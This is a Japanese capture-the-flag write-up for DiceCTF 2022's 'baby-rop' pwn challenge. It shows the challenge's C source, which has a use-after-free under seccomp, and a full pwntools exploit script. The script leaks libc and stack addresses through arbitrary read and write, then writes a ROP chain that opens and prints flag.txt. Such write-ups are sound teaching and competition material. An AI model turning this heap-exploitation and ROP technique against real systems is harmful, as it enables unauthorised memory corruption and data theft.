---
layout: chall
ctf_name: DiceCTF_2022
problem_name: baby-rop
genre: pwn
solved_date: 2022-02-05
during_ctf: true
tag: [heap, uaf, rop, seccomp]
---

### 概要

自明な UAF のあるアプリケーション。seccomp で諸々が縛られている。open や read などはできるが、execve はできない。

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

<details><summary>コード</summary>

```c
#include <stdio.h>
#include <stdlib.h>

#include <unistd.h>
#include "seccomp-bpf.h"

void activate_seccomp()
{
    struct sock_filter filter[] = {
        VALIDATE_ARCHITECTURE,
        EXAMINE_SYSCALL,
        ALLOW_SYSCALL(mprotect),
        ALLOW_SYSCALL(mmap),
        ALLOW_SYSCALL(munmap),
        ALLOW_SYSCALL(exit_group),
        ALLOW_SYSCALL(read),
        ALLOW_SYSCALL(write),
        ALLOW_SYSCALL(open),
        ALLOW_SYSCALL(close),
        ALLOW_SYSCALL(openat),
        ALLOW_SYSCALL(fstat),
        ALLOW_SYSCALL(brk),
        ALLOW_SYSCALL(newfstatat),
        ALLOW_SYSCALL(ioctl),
        ALLOW_SYSCALL(lseek),
        KILL_PROCESS,
    };

    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(struct sock_filter)),
        .filter = filter,
    };

    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}


#include <gnu/libc-version.h>
#include <stdio.h>
#include <unistd.h>
int get_libc() {
    // method 1, use macro
    printf("%d.%d\n", __GLIBC__, __GLIBC_MINOR__);

    // method 2, use gnu_get_libc_version 
    puts(gnu_get_libc_version());

    // method 3, use confstr function
    char version[30] = {0};
    confstr(_CS_GNU_LIBC_VERSION, version, 30);
    puts(version);

    return 0;
}

#define NUM_STRINGS 10

typedef struct {
    size_t length;
	char * string;
} safe_string;

safe_string * data_storage[NUM_STRINGS];

void read_safe_string(int i) {
    safe_string * ptr = data_storage[i];
    if(ptr == NULL) {
        fprintf(stdout, "that item does not exist\n");
        fflush(stdout);
        return;
    }

    fprintf(stdout, "Sending %zu hex-encoded bytes\n", ptr->length);
    for(size_t j = 0; j < ptr->length; ++j) {
        fprintf(stdout, " %02x", (unsigned char) ptr->string[j]);
    }
    fprintf(stdout, "\n");
    fflush(stdout);
}

void free_safe_string(int i) {
    safe_string * ptr = data_storage[i];
    free(ptr->string);
    free(ptr);
}

void write_safe_string(int i) {
    safe_string * ptr = data_storage[i];
    if(ptr == NULL) {
        fprintf(stdout, "that item does not exist\n");
        fflush(stdout);
        return;
    }

    fprintf(stdout, "enter your string: ");
    fflush(stdout);

    read(STDIN_FILENO, ptr->string, ptr->length);
}

void create_safe_string(int i) {

    safe_string * ptr = malloc(sizeof(safe_string));

    fprintf(stdout, "How long is your safe_string: ");
    fflush(stdout);
    scanf("%zu", &ptr->length);

    ptr->string = malloc(ptr->length);
    data_storage[i] = ptr;

    write_safe_string(i);

}

// flag.txt
int main() {

    get_libc();
    activate_seccomp();

    int idx;
    int c;
    
    while(1){
        fprintf(stdout, "enter your command: ");
        fflush(stdout);
        while((c = getchar()) == '\n' || c == '\r');

        if(c == EOF) { return 0; }

        fprintf(stdout, "enter your index: ");
        fflush(stdout);
        scanf("%u", &idx);

        if((idx < 0) || (idx >= NUM_STRINGS)) {
            fprintf(stdout, "index out of range: %d\n", idx);
            fflush(stdout);
            continue;
        }

        switch(c) {
            case 'C':
                create_safe_string(idx);
                break;
            case 'F':
                free_safe_string(idx);
                break;
            case 'R':
                read_safe_string(idx);
                break;
            case 'W':
                write_safe_string(idx);
                break;
            case 'E':
                return 0;
        }
    
    }
}
```

</details>


### 解法

「あなたは `execve('/bin/sh', 0, 0)` 以外の ROP ができますか?」という問題。AAR で libc や stack のアドレスをリークしてから ROP chain を直で書き込んで ROP をする。

<details><summary>スクリプト</summary>

```py
from pwn import *

BIN_NAME = 'babyrop'
REMOTE_ADDR = 'mc.ax'
REMOTE_LIBC_PATH = 'libc.so.6'
REMOTE_PORT = 31245
LOCAL = False

chall = ELF(BIN_NAME)
context.binary = chall

if LOCAL: stream = process(BIN_NAME)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

def prompt(choice):
    stream.sendlineafter(b': ', choice)

def create(i, l, content):
    if LOCAL is None: return
    prompt(b'C')
    prompt(str(i).encode())
    prompt(str(l).encode())
    stream.sendafter(b': ', content)

def free(i):
    if LOCAL is None: return
    prompt(b'F')
    prompt(str(i).encode())

def read(i):
    if LOCAL is None: return b''
    prompt(b'R')
    prompt(str(i).encode())
    stream.recvuntil(b'Sending ')
    l = int(stream.recvuntil(b' ', drop=True))
    stream.recvline()
    res = b''
    content = [int(x, 16) for x in stream.recvline(keepends=False)[1:].split()]
    assert len(content) == l
    return b''.join([(x).to_bytes(1, "little") for x in content])

def write(i, content):
    if LOCAL is None: return
    prompt(b'W')
    prompt(str(i).encode())
    stream.sendafter(b': ', content)

create(0, 0x100, b'\xde\xad\xbe\xef')
create(1, 0x100, b'\xde\xad\xbe\xef')
create(2, 16, b'AAAA')
free(0)
free(1)
create(1, 17, b'\xca\xfe\xba\xbe')

def fakeobj(addr, len):
    write(1, p64(len) + p64(addr))

def aar(addr, len):
    fakeobj(addr, len)
    return read(0)

def aaw(addr, content):
    fakeobj(addr, len(content))
    write(0, content)

stdout_addr = u64(aar(0x404020, 8))

libc = ELF(REMOTE_LIBC_PATH)
libc.address = stdout_addr - libc.symbols["_IO_2_1_stdout_"]
print(f'{hex(libc.address)=}')

stack_addr = u64(aar(libc.symbols["environ"], 8))
print(f'{hex(stack_addr)=}')

FLAG_TXT_ADDR = 0x404000
FLAG_ADDR = 0x4040a0

aaw(FLAG_TXT_ADDR, b'./flag.txt')

rop = ROP(libc)

rop.call('open', [FLAG_TXT_ADDR, 0])
rop.call('read', [3, FLAG_ADDR, 100])
rop.call('puts', [FLAG_ADDR])
rop.call('fflush', [libc.symbols["_IO_2_1_stdout_"]])
rop.call('read', [0, FLAG_ADDR, 30])

print(rop.dump())
aaw(stack_addr - 320, rop.chain())
# aaw(stack_addr - 0x1000, p64(0x401618) * 0x200)

# pause()
stream.sendline(b'E')
stream.sendline(b'0')

stream.interactive()
```

</details>

